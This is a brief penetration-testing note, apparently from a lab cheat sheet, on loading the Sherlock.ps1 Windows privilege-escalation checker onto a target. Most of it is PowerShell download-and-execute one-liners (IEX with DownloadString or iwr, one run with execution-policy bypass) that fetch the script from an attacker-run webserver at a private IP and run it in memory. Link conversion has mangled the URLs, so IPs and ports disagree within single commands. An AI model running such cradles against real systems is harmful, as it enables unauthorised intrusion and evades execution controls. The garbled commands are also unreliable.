<https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1>

Add Find-AllVulns at the very bottom of the script like so <https://youtu.be/kWTnVBIpNsE?t=836>

You may call out to our webserver and trigger the script like so:

IEX(New-Object Net.WebClient).downloadString('[http://192.168.119.148/Sherlock.ps1')](http://192.168.119.148:80/Sherlock.ps1'))
or
IEX(iwr -usebasicparsing [http://192.168.119.148/Sherlock.ps1)](http://192.168.119.148:81/Sherlock.ps1))


<https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1>
powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('[http://192.168.119.228/Sherlock.ps1');Find-AllVulns](http://192.168.119.157/Sherlock.ps1');Find-AllVulns)"


